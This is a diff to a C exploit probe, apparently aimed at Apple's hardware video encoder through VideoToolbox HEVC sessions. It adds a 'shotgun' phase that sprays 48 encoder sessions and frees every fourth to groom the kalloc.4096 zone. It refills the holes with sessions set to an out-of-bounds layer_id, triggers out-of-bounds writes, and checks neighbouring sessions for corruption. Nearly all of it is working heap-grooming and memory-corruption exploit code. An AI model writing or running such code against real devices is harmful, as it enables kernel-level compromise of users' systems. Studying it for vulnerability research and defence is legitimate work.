@@ -341,7 +341,151 @@ cleanup:
 }
 
 /*
- * Phase 3: Sweep layer_ids to find which ones cause visible corruption
+ * Phase 3: Shotgun strategy — multiple attackers for reliable adjacency
+ *
+ * On 16KB pages, kalloc.4096 holds 4 objects per page.
+ * Spray 48 sessions, free every 4th (12 holes), fill each hole with an
+ * attacker. With 12 attackers spread across the zone, at least one
+ * should be adjacent to a victim.
+ */
+static void phase_shotgun(int attacker_lid) {
+    int victim_offset = 0x432 + attacker_lid * 16 - 4096;
+
+    rlog("\n========================================\n");
+    rlog("PHASE 3-SHOTGUN: Multi-attacker spread\n");
+    rlog("  Strategy: 48 spray, 12 attackers, all test\n");
+    rlog("  Attacker layer_id: %d → victim offset 0x%03x\n",
+         attacker_lid, victim_offset);
+    rlog("========================================\n\n");
+
+    int spray_n = 48;
+    if (spray_n > MAX_SESSIONS) spray_n = MAX_SESSIONS;
+
+    /* Step 1: Spray */
+    rlog("[SHOTGUN] Spraying %d sessions...\n", spray_n);
+    int created = 0;
+    for (int i = 0; i < spray_n; i++) {
+        g_slots[i].session = create_hevc_session(i, 128, 128);
+        g_slots[i].index = i;
+        if (g_slots[i].session) {
+            g_slots[i].alive = 1;
+            created++;
+        } else {
+            g_slots[i].alive = 0;
+            rlog("[SHOTGUN] HW limit at %d sessions\n", created);
+            spray_n = i;
+            break;
+        }
+    }
+    rlog("[SHOTGUN] Created %d sessions\n", created);
+    if (created < 8) { rlog("[SHOTGUN] Too few sessions\n"); goto sg_cleanup; }
+
+    /* Step 2: Initialize all with safe encode */
+    rlog("[SHOTGUN] Initializing all sessions (safe encode)...\n");
+    for (int i = 0; i < spray_n; i++) {
+        if (!g_slots[i].alive) continue;
+        configure_mvhevc(g_slots[i].session, 1);
+        do_encode(g_slots[i].session, i, 128, 128);
+    }
+    usleep(100000);
+
+    /* Step 3: Free every 4th session (creates holes on each page) */
+    rlog("[SHOTGUN] Freeing every 4th session...\n");
+    int freed = 0;
+    int attacker_slots[16];
+    int n_attackers = 0;
+    for (int i = 3; i < spray_n && n_attackers < 16; i += 4) {
+        if (g_slots[i].alive) {
+            VTCompressionSessionInvalidate(g_slots[i].session);
+            CFRelease(g_slots[i].session);
+            g_slots[i].session = NULL;
+            g_slots[i].alive = 0;
+            attacker_slots[n_attackers++] = i;
+            freed++;
+        }
+    }
+    rlog("[SHOTGUN] Freed %d sessions, %d attacker slots\n", freed, n_attackers);
+    usleep(100000);
+
+    /* Step 4: Fill holes with attacker sessions + OOB layer_id */
+    rlog("[SHOTGUN] Creating %d attacker sessions (layer_id=%d)...\n",
+         n_attackers, attacker_lid);
+    int attackers_created = 0;
+    for (int a = 0; a < n_attackers; a++) {
+        int idx = attacker_slots[a];
+        g_slots[idx].session = create_hevc_session(idx, 128, 128);
+        if (g_slots[idx].session) {
+            g_slots[idx].alive = 1;
+            configure_mvhevc(g_slots[idx].session, attacker_lid);
+            attackers_created++;
+        }
+    }
+    rlog("[SHOTGUN] Created %d attacker sessions\n", attackers_created);
+
+    /* Step 5: Trigger OOB write from every attacker */
+    rlog("[SHOTGUN] Triggering OOB writes from all attackers...\n");
+    int oob_ok = 0;
+    for (int a = 0; a < n_attackers; a++) {
+        int idx = attacker_slots[a];
+        if (!g_slots[idx].alive) continue;
+        int st = do_encode(g_slots[idx].session, idx, 128, 128);
+        if (st == 0) oob_ok++;
+        else rlog("[SHOTGUN] Attacker %d encode failed: %d\n", idx, st);
+    }
+    rlog("[SHOTGUN] %d / %d OOB writes succeeded\n\n", oob_ok, attackers_created);
+
+    /* Step 6: Test ALL remaining victim sessions */
+    rlog("[SHOTGUN] Testing all victim sessions for corruption...\n");
+    int ok = 0, corrupted = 0, error = 0;
+    for (int i = 0; i < spray_n; i++) {
+        if (!g_slots[i].alive) continue;
+
+        int is_attacker = 0;
+        for (int a = 0; a < n_attackers; a++)
+            if (attacker_slots[a] == i) { is_attacker = 1; break; }
+        if (is_attacker) continue;
+
+        int adj = 0;
+        for (int a = 0; a < n_attackers; a++) {
+            if (i == attacker_slots[a] - 1 || i == attacker_slots[a] + 1)
+                { adj = 1; break; }
+        }
+
+        g_encode_results[i] = -999;
+        int st = do_encode(g_slots[i].session, i, 128, 128);
+
+        if (st == 0 && g_encode_results[i] == 0) {
+            ok++;
+        } else {
+            rlog("[SHOTGUN] Session %d (%s): ERROR st=%d cb=%d *** CORRUPTION ***\n",
+                 i, adj ? "ADJACENT" : "distant", st, g_encode_results[i]);
+            corrupted++;
+        }
+    }
+
+    rlog("\n[SHOTGUN] RESULTS: OK=%d, Corrupted=%d, Error=%d\n", ok, corrupted, error);
+    if (corrupted > 0) {
+        rlog("\n!!! SHOTGUN: CROSS-OBJECT CORRUPTION CONFIRMED !!!\n");
+        rlog("!!! %d victim sessions show altered behavior !!!\n", corrupted);
+    } else if (oob_ok > 0) {
+        rlog("\n[SHOTGUN] OOB writes succeeded but no visible corruption.\n");
+        rlog("[SHOTGUN] Corrupted fields may not affect basic encode path.\n");
+        rlog("[SHOTGUN] Next: try crash oracle or different victim operations.\n");
+    }
+
+sg_cleanup:
+    for (int i = 0; i < MAX_SESSIONS; i++) {
+        if (g_slots[i].alive && g_slots[i].session) {
+            VTCompressionSessionInvalidate(g_slots[i].session);
+            CFRelease(g_slots[i].session);
+            g_slots[i].session = NULL;
+            g_slots[i].alive = 0;
+        }
+    }
+}
+
+/*
+ * Phase 4: Sweep layer_ids to find which ones cause visible corruption
  */
 static void phase_sweep(int spray_count) {
     rlog("\n========================================\n");
@@ -379,6 +523,9 @@ int main(int argc, char *argv[]) {
         if (sc < 4) sc = 8;
         if (sc > 32) sc = 32;
         phase_two_session(sc, 190);
+    } else if (strcmp(mode, "shotgun") == 0) {
+        phase_max_sessions();
+        phase_shotgun(190);
     } else if (strcmp(mode, "sweep") == 0) {
         int sc = phase_max_sessions();
         if (sc < 4) sc = 8;
@@ -393,10 +540,11 @@ int main(int argc, char *argv[]) {
         phase_two_session(sc, lid);
     } else {
         rlog("Usage: AVETwoSession <mode>\n");
-        rlog("  max    — determine max concurrent sessions\n");
-        rlog("  test   — two-session test with layer_id=190\n");
-        rlog("  sweep  — sweep layer_ids 189-200\n");
-        rlog("  lid_N  — two-session test with layer_id=N\n");
+        rlog("  max      — determine max concurrent sessions\n");
+        rlog("  test     — two-session test with layer_id=190\n");
+        rlog("  shotgun  — multi-attacker spread for reliable adjacency\n");
+        rlog("  sweep    — sweep layer_ids 189-200\n");
+        rlog("  lid_N    — two-session test with layer_id=N\n");
     }
 
     rlog("\n=== Probe complete ===\n");
